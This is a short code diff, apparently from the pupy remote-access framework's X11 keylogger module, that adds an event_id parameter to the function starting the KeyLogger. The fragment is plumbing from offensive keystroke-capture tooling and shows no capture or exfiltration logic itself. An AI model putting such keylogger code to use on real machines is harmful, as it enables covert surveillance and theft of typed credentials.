@@ -518,12 +518,12 @@ KEYSYM_TO_UNICODE_TABLE = {
 def keysym_to_unicode(ks):
     return KEYSYM_TO_UNICODE_TABLE.get(ks)
 
-def keylogger_start():
+def keylogger_start(event_id=None):
     if pupy.manager.active(KeyLogger):
         return False
 
     try:
-        pupy.manager.create(KeyLogger)
+        pupy.manager.create(KeyLogger, event_id=event_id)
     except:
         return 'no_x11'
 
